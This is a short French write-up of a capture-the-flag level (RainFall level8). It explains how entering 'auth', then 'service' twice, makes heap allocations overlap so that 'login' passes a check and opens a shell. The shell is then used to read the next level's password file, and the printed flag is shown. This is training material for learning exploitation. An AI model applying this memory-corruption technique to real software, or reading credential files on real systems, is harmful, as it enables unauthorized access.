Dans ce niveau on voit avec radar qu'il y a des instructions qui sont compare:
    `"auth "`, `"reset"`,`"service"` et `"login"`

Quand on tape `"auth "` en premier input on voit que le prog store a cette adresse `0x804a008`

Ensuite avec `"reset"` on appelle un free donc on veut pas ca

En utilisant `"service"` on store a une nouvelle adresse avec strdup `0x804a018`

Il faut donc reutiliser `"service"` pour que strdup reecrive sur le "auth "

Ensuite la commande `"login"` nous permet de lancer la comparaison qui est donc valide

On a donc le `"/bin/sh"` qui se lance une fois que la comparaison est bonne:
```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 
```
On peut donc lancer la commande `cat /home/user/level9/.pass` qui nous donne le flag:
    `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`